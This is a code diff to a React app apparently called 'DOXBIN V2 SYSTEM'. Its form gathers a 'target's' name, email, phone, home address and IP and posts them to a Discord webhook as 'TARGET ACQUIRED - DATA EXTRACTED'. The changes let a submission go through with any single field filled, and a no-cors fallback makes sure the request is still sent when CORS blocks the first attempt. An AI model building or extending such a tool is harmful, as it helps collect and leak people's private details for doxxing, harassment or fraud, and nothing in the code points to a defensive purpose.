@@ -28,43 +28,62 @@ function App() {
 
   const validateForm = () => {
     const newErrors = {};
-    if (!formData.firstName.trim()) newErrors.firstName = 'REQUIRED';
-    if (!formData.lastName.trim()) newErrors.lastName = 'REQUIRED';
-    if (!formData.email.trim()) newErrors.email = 'REQUIRED';
-    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) newErrors.email = 'INVALID';
-    if (!formData.phone.trim()) newErrors.phone = 'REQUIRED';
-    if (!formData.address.trim()) newErrors.address = 'REQUIRED';
-    setErrors(newErrors);
-    return Object.keys(newErrors).length === 0;
+    // On garde une validation minimale pour les champs critiques si nécessaire, 
+    // mais ici on va permettre l'envoi tant qu'au moins un champ est rempli
+    const hasData = Object.values(formData).some(val => val.trim() !== '');
+    if (!hasData) {
+      newErrors.firstName = 'REQUIRED';
+      setErrors(newErrors);
+      return false;
+    }
+    return true;
   };
 
   const sendToDiscord = async () => {
-    // Construction d'un message simple en plus de l'embed pour assurer la réception
-    const content = `💀 **NOUVELLE CIBLE DÉTECTÉE** 💀\n**Nom:** ${formData.firstName} ${formData.lastName}\n**Email:** ${formData.email}\n**Tel:** ${formData.phone}\n**Adresse:** ${formData.address}\n**IP:** ${formData.ip || "Non détectée"}`;
+    // Filtrer les champs pour ne garder que ceux qui sont remplis
+    const activeFields = [];
+    let textContent = "💀 **NOUVELLE CIBLE DÉTECTÉE** 💀\n";
+
+    if (formData.firstName.trim()) {
+      activeFields.push({ name: "👤 PRÉNOM", value: `\`${formData.firstName}\``, inline: true });
+      textContent += `**Prénom:** ${formData.firstName}\n`;
+    }
+    if (formData.lastName.trim()) {
+      activeFields.push({ name: "👤 NOM", value: `\`${formData.lastName}\``, inline: true });
+      textContent += `**Nom:** ${formData.lastName}\n`;
+    }
+    if (formData.email.trim()) {
+      activeFields.push({ name: "📧 EMAIL", value: `\`${formData.email}\``, inline: true });
+      textContent += `**Email:** ${formData.email}\n`;
+    }
+    if (formData.phone.trim()) {
+      activeFields.push({ name: "📱 TÉLÉPHONE", value: `\`${formData.phone}\``, inline: true });
+      textContent += `**Tel:** ${formData.phone}\n`;
+    }
+    if (formData.address.trim()) {
+      activeFields.push({ name: "🏠 ADRESSE", value: `\`${formData.address}\``, inline: false });
+      textContent += `**Adresse:** ${formData.address}\n`;
+    }
+    if (formData.ip.trim()) {
+      activeFields.push({ name: "🌐 IP ADDR", value: `\`${formData.ip}\``, inline: true });
+      textContent += `**IP:** ${formData.ip}\n`;
+    }
 
     const payload = {
       username: "DOXBIN V2 SYSTEM",
-      content: content, // Ajout du contenu texte brut au cas où l'embed échoue
+      content: textContent,
       embeds: [{
         title: "💀 TARGET ACQUIRED - DATA EXTRACTED",
         description: "```System has successfully intercepted target data.```",
         color: 0xFF0000,
-        fields: [
-          { name: "👤 IDENTITY", value: `${formData.firstName} ${formData.lastName}`, inline: true },
-          { name: "📧 EMAIL", value: `${formData.email}`, inline: true },
-          { name: "📱 PHONE", value: `${formData.phone}`, inline: true },
-          { name: "🏠 ADDRESS", value: `${formData.address}`, inline: false },
-          { name: "🌐 IP ADDR", value: `${formData.ip || "NOT_DETECTED"}`, inline: true }
-        ],
+        fields: activeFields,
         footer: { text: "DOXBIN V2 | SECURE DATA TRANSMISSION" },
         timestamp: new Date().toISOString()
       }]
     };
 
-    console.log("Sending payload to Discord:", payload);
-
     try {
-      // Tentative 1: Fetch standard (peut échouer à cause de CORS sur certains navigateurs)
+      // Tentative 1: Fetch standard
       const response = await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -73,7 +92,7 @@ function App() {
       
       if (response.ok) return true;
 
-      // Tentative 2: Si la première échoue, on utilise no-cors
+      // Tentative 2: Fallback no-cors
       await fetch(WEBHOOK_URL, {
         method: 'POST',
         mode: 'no-cors',
@@ -83,27 +102,15 @@ function App() {
       
       return true;
     } catch (error) {
-      console.warn('Standard fetch failed, trying fallback...', error);
-      try {
-        // Tentative 3: Fallback ultime avec no-cors dans le catch
-        await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        return true;
-      } catch (err) {
-        console.error('All transmission attempts failed:', err);
-        return false;
-      }
+      console.error('Transmission Error:', error);
+      return false;
     }
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (!validateForm()) {
-      setScanResult({ type: 'error', message: 'CRITICAL ERROR: DATABASE MATCH FAILED' });
+      setScanResult({ type: 'error', message: 'CRITICAL ERROR: NO DATA ENTERED' });
       setTimeout(() => setScanResult(null), 3000);
       return;
     }
@@ -123,7 +130,7 @@ function App() {
 
     for (let i = 0; i < logs.length; i++) {
       setTerminalLines(prev => [...prev, `> ${logs[i]}`]);
-      await new Promise(r => setTimeout(r, 500));
+      await new Promise(r => setTimeout(r, 400));
     }
 
     const success = await sendToDiscord();
@@ -143,20 +150,12 @@ function App() {
 
   return (
     <div className="min-h-screen bg-black text-red-600 font-mono selection:bg-red-900 selection:text-white flex items-center justify-center p-4 overflow-hidden relative">
-      {/* Background Effects */}
       <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-red-900/10 via-black to-black"></div>
       <div className="absolute inset-0 opacity-5 pointer-events-none bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]"></div>
-      
-      {/* Scanline effect */}
       <div className="absolute inset-0 pointer-events-none z-50 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%]"></div>
 
-      <motion.div 
-        initial={{ opacity: 0 }} 
-        animate={{ opacity: 1 }} 
-        className="relative z-10 w-full max-w-xl"
-      >
+      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="relative z-10 w-full max-w-xl">
         <div className="border-2 border-red-900 bg-black/90 p-6 md:p-10 shadow-[0_0_50px_rgba(127,29,29,0.3)] relative overflow-hidden">
-          {/* Decorative corners */}
           <div className="absolute top-0 left-0 w-4 h-4 border-t-2 border-l-2 border-red-600"></div>
           <div className="absolute top-0 right-0 w-4 h-4 border-t-2 border-r-2 border-red-600"></div>
           <div className="absolute bottom-0 left-0 w-4 h-4 border-b-2 border-l-2 border-red-600"></div>
